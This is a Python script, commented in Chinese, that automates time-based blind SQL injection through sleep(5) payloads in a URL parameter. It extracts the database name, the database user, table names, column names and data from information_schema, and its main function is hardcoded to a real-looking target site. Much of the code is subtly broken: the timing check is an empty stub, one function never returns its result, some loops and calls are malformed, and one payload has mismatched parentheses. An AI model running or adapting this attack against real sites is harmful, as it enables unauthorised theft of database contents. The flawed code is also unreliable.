#!usr/bin/python
#!encoding=utf8

from urllib import request
from urllib.parse import urlparse
from urllib.parse import urlunsplit
import re
import requests


headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"}

class SQL():
    def __init__(self,url):
        self.url=url        #设置全局url
        self.ParseURL(url)  #解析url，拆分
        self.RUN()          #启动




    def ParseURL(self,url):
        '''
        解析URL，拆分
        :return:
        '''
        parse_url=urlparse(url)
        self.url_scheme=parse_url.scheme
        self.url_netloc=parse_url.netloc
        self.url_path=parse_url.path
        self.url_params=parse_url.params
        self.url_query=parse_url.query
        self.url_comment=parse_url.fragment


    def CheckText(self,text):
        '''
        检验布尔，若网页返回值有特征码，返回True
        :param text: 网页返回值
        :return:
        '''
        if text in check_text:      #如果结果出现预先得到的测量值，返回布尔成功
            return True
        else:
            return False

    def CheckSleep(self,x):
        '''
        判断布尔注入是否导致系统休眠
        :param x:
        :return: True/False
        '''
        pass


    def RUN(self):
        '''

        :return:
        '''
        # burp_url = [self.url_scheme, self.url_netloc, self.url_path, self.url_query, '']
        # self.x = urlunsplit(burp_url)
        self.GuessTables()


    def BurpLength(self,data):
        '''
        爆破数据长度脚本
        :param data:系统变量名
        :return:数据长度
        '''
        for i in range(1,256):
            X="{0} and if(length({1})={2},sleep(5),1) %23".format(self.url,data,i)   #payload为查询成功即系统休眠5秒
            #print(X)
            res=requests.get(X)
            if self.CheckSleep(res.text):
                return i



    def BurpDatasLength(self,data,table,num):
        '''
        爆破数据
        :param data: 查询数据
        :param table: 查询表
        :param num: 数量
        :return:
        '''
        length = []  # 存放各表长度
        for i in range(1, num + 1):
            for j in range(1, 100):
                X = "{0} and IF((select length({3}) from information_schema.{4} where table_schema=database() limit {1} ,1)={2},sleep(5),1) %23".format(
                    self.url, i, j,data,table)
                res = requests.get(X)
                if self.CheckSleep(res.text):
                    length.append(j)
                    break



    def BurpChars(self,data,length):
        '''
        爆破数据，系统变量专用
        :param data:爆破对象
        :param length:对象长度
        :return: 爆破结果
        '''
        x=[]
        for i in range(1,length+1):
            for j in range(32,127):
                X = "{0} and IF(ascii(substr({1},{2},1))={3},sleep(5),1) %23".format(self.url, data, i, j)
                res = requests.get(X)
                if self.CheckSleep(res.text):
                    x.append(chr(j))
                    break
        x="".join(x)                        #list>>str
        return x

    def BurpTables(self,num):
        '''
        爆破表名
        :param num: 表数量
        :return: 存储表名称的list
        '''
        length=self.BurpDatasLength("table_name","tables",num)     #存放各表长度的list
        m=[]                    #存储当前字母
        n=[]                    #存储当前完整结果

        for i in range(1,num+1):
            for l in range(1,length[i]+1):
                for j in range(32,127):
                    X="{0} and IF((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),{1},1)={2},sleep(5),1)%23".format(self.url,l,j)
                    res=requests.get(X)
                    if self.CheckSleep(res.text):
                        m.append(chr(j))
            n.append(m)
            m=''
        return n

    def BurpColumns(self,num,table):
        '''
        爆破列名
        :param num: 列数量
        :param table:
        :return:
        '''
        length = []  # 存放各列长度
        for i in range(1, num + 1):
            for j in range(1, 100):
                X = "{0} and IF((select column_name from information_schema.columns where table_schema=database() and table_name={3} limit {1} ,1)={2},sleep(5),1) %23".format(
                    self.url, i, j, self.str_to_hex(table))
                res = requests.get(X)
                if self.CheckSleep(res.text):
                    length.append(j)
                    break

        m = []  # 存储当前字母
        n = []  # 存储当前完整结果

        for i in range(1, num + 1):
            for l in range(1, length[i]+1):
                for j in range(32, 127):
                    X = "{0} and IF((ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name={3} limit 0,1),{1},1)={2},sleep(5),1)%23".format(
                        self.url, l, j,self.str_to_hex(table))
                    res = requests.get(X)
                    if self.CheckSleep(res.text):
                        m.append(chr(j))
            n.append(m)
            m = ''
        return n

    def BurpDatas(self,columns):
        '''
        爆破数据
        :param columns:列list
        :return:
        '''
        data=[]
        for column in columns:
            for j in range(32,127):
                X="{0} and IF(ascii(select {1} from {2} limit 0,1),{3},1))={4},sleep(5),1) %23".format(self.url,column,"table","length",j)
                res = requests.get(X)
                if self.CheckSleep(res.text):
                    data.append(i)  # 各表中列数量
                    break




    def str_to_hex(self,str):
        '''
        字符串转16进制
        :param str: 字符串
        :return: 字符串的16进制
        '''
        m = []
        for a in str:
            m.append(str(ord(a)))
        n = "".join(m)
        n = int(n)
        res=hex(n)
        return str(res)

    def GuessColumns(self, tables):
        '''
        猜测列名
        :param tables:
        :return:
        '''

        num_columns=[]
        for table in tables:
            for i in range(1,100):
                X="{0} and if((select count(column_name) from information_schema.columns where table_schema=database() and table_name={2})={1},sleep(5),1) %23".format(self.url,i,self.str_to_hex(table))  #获取表数量
                # print(X)
                res=requests.get(X)
                if self.CheckSleep(res.text):
                    num_columns.append(i)                     #各表中列数量
                    break


        for num,table in num_columns,tables:
            if num !=0:
                length = []  # 存放各列长度
                for i in range(1, num + 1):
                    for j in range(1, 100):
                        X = "{0} and IF((select length({3}) from information_schema.columns where table_schema=database() and table_name={4} limit {1} ,1)={2},sleep(5),1) %23".format(
                            self.url, i, j, "column_name",self.str_to_hex(table))
                        res = requests.get(X)
                        if self.CheckSleep(res.text):
                            length.append(j)
                            break

                for l in length:
                    Column=[]
                    x=self.BurpColumns()
                    Column.append(x)
                    self.columns="".join(column)

        self.BurpDatas(self.columns)




    def GuessTables(self):
        '''
        猜测数据表
        :return:
        '''
        self.length_database=self.BurpLength("database()")    #获取数据库名称长度
        self.length_user=self.BurpLength("user()")            #获取数据库用户名称长度
        self.database=self.BurpChars("database()",self.length_database)    #获取数据库名称
        self.db_user=self.BurpChars("user()",self.length_user)             #获取数据库用户名名称

        for i in range(1,100):
            X="{0} and if((select count(table_name) from information_schema.tables where table_schema=database())={1},sleep(5),1) %23".format(self.url,i)  #获取表数量
            # print(X)
            res=requests.get(X)
            if self.CheckSleep(res.text):
                self.number_tables=i                     #表数量
                break

        self.Tables=self.BurpTables(self.number_tables)       #接收表名称的list
        self.GuessColumns(self.Tables)







def main():
    # try:
    #     url=sys.argv[1]
    # except:
    #     url=input("请输入带参闭合的URL，例子：www.domain.com/?id=1'")
    #check_text=input("请输入页面布尔注入成功后的特征值，源码可见：")
    url="http://www.keyboy.xyz/index.php/?id=1"
    SQL(url)


if __name__ =="__main__":
    main()